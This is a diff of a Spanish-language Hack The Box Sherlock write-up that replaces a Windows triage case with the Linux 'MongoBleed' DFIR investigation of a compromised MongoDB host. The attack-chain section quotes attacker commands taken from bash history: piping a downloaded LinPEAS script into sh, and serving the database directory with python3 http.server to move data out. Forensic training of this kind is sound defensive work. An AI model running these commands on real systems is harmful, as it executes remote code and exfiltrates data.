@@ -1,12 +1,11 @@
 ---
 sherlock: MangoBleed
-domain: SOC
+domain: DFIR / Linux
 difficulty: Very Easy
 platform: Hack The Box
 state: Retired
-tags: [dfir, windows, triage, kape, timeline, persistence]
+tags: [dfir, linux, mongodb, uac, cve-2025-14847, exfiltracion]
 ---
-
 
 # MangoBleed — Hack The Box
 
@@ -16,58 +15,60 @@ tags: [dfir, windows, triage, kape, timeline, persistence]
 
 ## Escenario
 
-Una empresa de logística detecta conexiones salientes raras en una estación de trabajo. Se entrega una **imagen de triaje** (artefactos volátiles y de disco) y hay que averiguar cómo entró el atacante, qué dejó instalado y qué se llevó.
+El host `mongodbsync` es un **MongoDB secundario** que se mantiene una vez al mes. El administrador acaba de oír hablar de *MongoBleed* y entrega una **adquisición de triaje hecha con UAC** (`uac-mongodbsync-linux-triage.tar.gz`) para confirmar si hubo compromiso y reconstruir la actividad.
 
 ## Evidencias
 
-- Triaje tipo KAPE: `$MFT`, `UsnJrnl`, registro, `Prefetch`, `Amcache`, logs de eventos.
-- Directorio de usuario con descargas y documentos recientes.
-- Opcional: volcado de memoria.
+```text
+uac-mongodbsync-linux-triage/
+├── bodyfile
+├── hash_executables
+├── [root]/var/log/mongod.log        (JSON estructurado)
+├── [root]/var/log/auth.log
+├── [root]/root/.bash_history
+└── [live]/...
+```
 
 ## Investigación
 
-### 1. Orden de trabajo
+### 1. La vulnerabilidad del enunciado
 
-Empieza por lo que da contexto temporal y termina en el detalle:
-
-```text
-ejecución  -> Prefetch, Amcache, UserAssist, SRUM
-persistencia -> Run keys, tareas programadas, servicios, Startup
-acceso a ficheros -> LNK, JumpLists, RecentDocs
-red -> logs de firewall/proxy, DNS cache
-```
-
-`PECmd` sobre `Prefetch` da primera ejecución, número de ejecuciones y ruta del binario; `AmcacheParser` añade hashes y metadatos del ejecutable.
-
-### 2. Construir la línea de tiempo
+MongoBleed es **CVE-2025-14847**: una fuga de memoria del servidor MongoDB en el manejo de la compresión zlib de mensajes de red. No requiere autenticación y expone fragmentos de memoria (incluidas credenciales) a quien pueda hablar con el puerto. La versión afectada del caso es **8.0.16**, que se confirma en el `buildInfo`/arranque de `mongod.log`.
 
 ```bash
-log2timeline.py --storage-file mango.plaso triage/
-psort.py -o l2tcsv mango.plaso "date > '2026-01-01'" > timeline.csv
+grep -o '"msg":"[^"]*"' mongod.log | sort | uniq -c | sort -rn | head
+grep -i buildInfo mongod.log | head
 ```
 
-La clave está en el orden: descarga del archivo comprimido → ejecución del instalador → creación de servicio o tarea → primeras conexiones. Cualquier salto en esa secuencia (por ejemplo, ejecución sin descarga visible) apunta a un segundo vector.
+### 2. Acceso inicial
 
-### 3. Persistencia
+`auth.log` conserva las sesiones `sshd` del usuario `mongoadmin`: dos aperturas seguidas desde la misma IP externa, la segunda justo antes de la actividad manual. Esa IP es el origen del atacante y la cuenta comprometida, la de administración.
 
 ```bash
-regipy-dump -o out/ NTUSER.DAT
-grep -i "run" out/*.json | head
+grep Accepted auth.log
+last -f wtmp | head
 ```
 
-Se revisan `Run`/`RunOnce` (HKCU y HKLM), tareas programadas (`Windows\System32\Tasks`) y servicios nuevos. Un binario en `%APPDATA%` o `%LOCALAPPDATA%\Temp` referenciado desde ahí es el implante.
+### 3. Manos en el teclado
 
-### 4. Exfiltración
+El `.bash_history` de `root` es la pieza central: descarga de **LinPEAS** desde el release de PEASS-ng, ejecución, y después un `cd` a un directorio concreto seguido de un servidor web de Python para sacar datos.
 
-Con la herramienta identificada se busca su rastro: directorios de staging (`.zip`, `.rar` con fechas del incidente), historial del navegador y conexiones a un dominio de transferencia. El volumen en `SRUM`/firewall ayuda a responder «cuánto salió».
+```bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python3 -m http.server
+```
+
+El directorio objetivo es **`/var/lib/mongodb`**: el atacante empaqueta la base de datos y la sirve por HTTP en lugar de usar el propio protocolo de Mongo.
 
 ## Conclusiones
 
-- Acceso por descarga y ejecución de un instalador troyanizado desde el navegador.
-- Persistencia en el perfil del usuario, sin privilegios de administrador.
-- Datos empaquetados y enviados a un servicio de almacenamiento externo.
+- Acceso: explotación no autenticada de **CVE-2025-14847** contra el MongoDB expuesto.
+- Escalada: la cuenta `mongoadmin` ya tenía privilegios suficientes; LinPEAS sólo confirma el terreno.
+- Exfiltración: copia de `/var/lib/mongodb` servida con `python3 -m http.server`.
 
 ## Lecciones
 
-- `Prefetch` + `Amcache` + `UserAssist` son el trío para «qué se ejecutó y cuándo».
-- La persistencia en el perfil del usuario evade controles que solo miran servicios del sistema.
+- Un CVE de fuga de memoria se detecta por la versión y por conexiones anómalas al puerto, no por firmas de malware.
+- En triajes UAC, `auth.log` + `.bash_history` reconstruyen casi toda la cadena.
+- El histórico de comandos mezcla herramientas legítimas (LinPEAS) con la exfiltración: hay que leerlo entero.
+- Mitigación: actualizar MongoDB, cerrar el puerto a Internet y alertar de `python -m http.server` en servidores.
